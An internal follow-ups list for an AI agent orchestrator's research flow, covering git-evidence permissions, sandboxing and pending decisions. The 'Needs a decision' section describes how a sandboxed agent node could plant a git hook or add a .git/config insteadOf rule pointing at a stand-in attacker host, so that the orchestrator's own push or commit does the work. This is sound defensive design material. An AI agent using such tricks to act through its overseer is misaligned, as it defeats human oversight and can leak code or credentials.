# deep_research post-mortem — follow-ups

The campaign's running list of things that outlived the item that produced them: open decisions, watch items, operational consequences, and deliberate non-goals. Each item's own document remains the record of what it did and why; this file exists so the residue does not have to be rediscovered by re-reading eight documents.

Add to it as items land. Keep an entry only while it can still cost something — delete it when it is done or has become untrue, rather than marking it resolved.

- [Needs a decision](#needs-a-decision) — someone has to answer before it can close
- [Watch items](#watch-items) — nothing to do unless the world changes
- [Operational consequences](#operational-consequences) — true of every target repo, not of the code
- [Carried into `main`](#carried-into-main) — the derived-docs refresh backlog
- [Deliberate non-goals](#deliberate-non-goals) — decided against; recorded so they are re-decided, not re-discovered

## Needs a decision

### A poisoned `.git` still parks the task — confirm this is what was meant (P1.4a)

Operator decision 2 (2026-07-26) says a read-only node holding the git-evidence grant must **never** park the task in `manual_action_required`. That is implemented for a working-tree write. It was **not** applied to Git control-state drift, which still raises `NodeManualRequired` on its existing path. One line either way; needs a yes/no.

The two are different events, and the difference is what the decision turns on:

- **A stray file in the working tree.** The node leaves `notes.txt` (or overwrites `README.md`) in the clone. Nothing acts on it: `_apply_post_edit_guard` stays off for a read-only node, so no diff is captured, nothing is staged, no downstream node is handed it, and the publish node commits an explicit pathspec rather than whatever is lying around. The file just sits there until the clone is cleaned up. Parking a whole audit run over that would trade a real capability for a harmless accident — so: console warning + ⚠️ trace, outcome stays `done`. **This is decision 2, implemented.**
- **A rewritten Git control file.** Two concrete shapes:
  - `.git/hooks/post-checkout` (or `pre-commit`, `post-commit`, …) gains a script. Git hooks are executed by **whoever runs the next git command in that clone** — and the next git command is the orchestrator's own commit / branch switch / push. The node needs write access to nothing else: it has arranged for the orchestrator to run its code, with the orchestrator's credentials.
  - `.git/config` gains `[url "git@attacker.example:x.git"] insteadOf = git@github.com:` — the orchestrator's later `git push` then pushes the branch somewhere else, and everything up to that point looks normal.

  Both defeat the "only the orchestrator does commit / push / PR" invariant by borrowing the orchestrator rather than bypassing it. This is what the WRI-009 fingerprint exists to catch, and before [P1.4a](p1-4a-read-only-git-evidence.md) a read-only node was not fingerprinted at all — its §1 named that as an unwatched hole and its §3 asked for the fingerprint so that drift "is still detected". Detection that only logs would let the orchestrator go on to commit and push through the poisoned clone, which is the outcome the guard was built to prevent.

So the reading implemented is: decision 2 governs **the accident it describes** (a stray write), and does not silently downgrade a pre-existing security invariant for exactly the node class that just gained a shell.

**If the literal reading was intended** — never park, whatever changed — the change is at the compare site in [`core/flow/nodes/agent.py`](../../../src/wastech_orchestrator/core/flow/nodes/agent.py), in `_invoke`, where `compare_git_control_state` currently raises:

```python
if control_before is not None and git is not None:
    drift = git.compare_git_control_state(control_before)
    if drift is not None:
        raise NodeManualRequired(...)  # ← today, for every attempt that can run commands
```

Making it warn-only for a read-only-with-shell attempt means branching on `self._is_workspace_write(node, ctx)` there and routing the read-only case into the same `read_only_write` signal the working-tree check already uses. Roughly ten lines including the test. Do **not** do it by dropping the fingerprint — losing detection is strictly worse than either behavior.

## Watch items

### `--allowedTools` allow-direction semantics are pinned by a manual probe, not by the suite (P1.4a)

The Claude half of the git-evidence grant rests on a fact about `claude` 2.1.217 that no offline test can assert: under `--permission-mode dontAsk`, a `Bash` invocation matching none of the `--allowedTools` patterns is auto-**denied**. It was verified by hand (all four probes are recorded in [P1.4a](p1-4a-read-only-git-evidence.md)'s `## Implemented`), and the presence of the `--allowedTools` flag is checked at preflight — but the _semantics_ are not, because proving them needs a real model turn.

If a future CLI flips that default to auto-approve, the verb allowlist becomes decorative and the granted shell is unrestricted. The blast radius is bounded by the second layer: the OS sandbox write-denies the whole clone, so the node still cannot change the repository, and `security.denied_commands` still blocks commit/push/PR. What would be lost is the confinement to _reading git_ — the node could run arbitrary read commands.

Re-probe when pinning a new Claude CLI major, using the four probes in the item. If the behavior ever flips, the documented fallback is the one the item names: drop the verb allowlist and rely on the sandbox alone, exactly like Codex.

### The git-evidence master switch does not gate Codex, and cannot (P1.4a)

`security.allow_git_evidence: false` (the default) does **not** mean "no node can read git history anywhere". It means "no node gains a capability it did not already have". A Codex `read-only` node can run `git log` today and will keep doing so with the switch off, because Codex's `read-only` sandbox permits command execution — its mutation ban comes from the workspace being mounted `read` with the network off, not from a verb list.

So the provider asymmetry [P1.4a](p1-4a-read-only-git-evidence.md)'s Problem section describes is **resolved only when the switch is on**. With it off, the same flow still has different reach depending on which provider runs the node. That is the intended behavior of an opt-in and is stated in `guide/flows/reference.md`, but an operator who reads the switch as a global kill-switch will be surprised.

## Operational consequences

### Target repositories need a `.worc/flows/` refresh (P1.4, P1.4a, P0.1)

A target repo that already carries `.worc/flows/deep_research.yaml` keeps running **its own** copy, so nothing the campaign changed in the packaged flow reaches it until that tree is refreshed. Three items have now accumulated behind that one refresh:

- **[P1.4](p1-4-audit-coverage-gate.md)** — the refresh must bring the four new role files (`analysis_core.md`, `analysis_surfaces.md`, `analysis_docs_tests.md`, `coverage.md`) and drop `repository_analysis.md`, **or the flow fails to load on a missing `role_file`**. This is the only entry here that can break a run rather than merely withhold an improvement.
- **[P0.1](p0-1-evaluator-gate-severity.md)** — `gate_severity` on the packaged evaluators.
- **[P1.4a](p1-4a-read-only-git-evidence.md)** — `git_evidence: true` on the three analysis nodes. Withholding it is harmless: the nodes keep behaving as they do today.

Worth doing as one refresh with one verification pass rather than three.

### `git_evidence` on the packaged analysis nodes was implementation initiative (P1.4a)

[P1.4a](p1-4a-read-only-git-evidence.md) §4 specified the declaration _surface_, not that the packaged flow use it. The three `deep_research` analysis nodes were given `git_evidence: true` anyway, on the reasoning recorded in its `## Implemented`: leaving the capability reachable-but-undeclared would mean hand-editing a packaged flow to get any benefit from the item. Inert by default. Flagged here in case that call is not wanted — removing it is three lines of YAML.

## Carried into `main`

The `docs/` tree is reconstructed on `main` from the merged `dev` diff as a separate task. Doc-impact notes the campaign has accumulated for it, so the reconstruction has breadcrumbs rather than a bare diff:

- **[P1.4](p1-4-audit-coverage-gate.md)** — the node-output channel now spans evaluators (`configuration.md`, the flow-authoring page's prompt-variable table); `deep_research`'s graph gained three nodes and a gate (`worc_architecture.md`, `cookbook.md`).
- **[P1.4a](p1-4a-read-only-git-evidence.md)** — a new `security.*` key and a new per-node flow field (`configuration.md`, the flow-authoring page); and the `read-only` permission profile no longer implies "no shell" (`worc_architecture.md`, `glossary.md`).

## Deliberate non-goals

Decided against, not overlooked.

### P1.4a — read-only git evidence

- **No `isolation_reasons` arm for the grant.** That preflight receives only the provider config and cannot see whether any node declares `git_evidence`, so keying it on the switch alone would fail preflight for runs that never use the capability. The host check that matters is per-attempt and already lives in the adapter, with the declaration in hand — a granted shell on a host that cannot sandbox it raises `CAPABILITY_UNAVAILABLE` there. Reasoning is in the module docstring of [`security/isolation.py`](../../../src/wastech_orchestrator/security/isolation.py). Revisit only if operators start hitting the per-attempt refusal late in a run and want it earlier.
- **No evaluator-side write detection.** The field is accepted on evaluator nodes and reaches the request, but the before/after working-tree comparison lives in the agent runner only, as §3 describes. An evaluator with a granted shell is protected by the same sandbox; it simply would not produce the warning if that sandbox failed. Worth adding if a flow ever grants an evaluator the verbs in practice.
- **`None` and `False` on the node field carry the same behavior.** Both mean "did not ask". The tri-state is the shape operator decision 1 called for and mirrors `network_access`; what would give `False` its own meaning is a flow-wide default, and no flow needs one.
- **Codex adapter untouched.** A test pins that its profile is unchanged _and why_ — three keys, no command dimension, workspace `read`, network off, which is a stronger mutation ban than any allowlist can be.

### P1.4 — coverage gate

- **The hardcoded `{repo}/docs/research/{task_id}/report.md` in `verifier.md` / `critic.md` stays for now.** It is an instance of the anti-pattern the campaign README rules out, and [P2.8](p2-8-node-output-handoff.md) piece 2 is supposed to remove it — but doing so before **piece 1** would point both evaluators at a 4 KB chat sign-off instead of the deliverable, because `{synthesis_path}` resolves to the sign-off today. Sequenced, not forgotten: it closes with P2.8 piece 1.
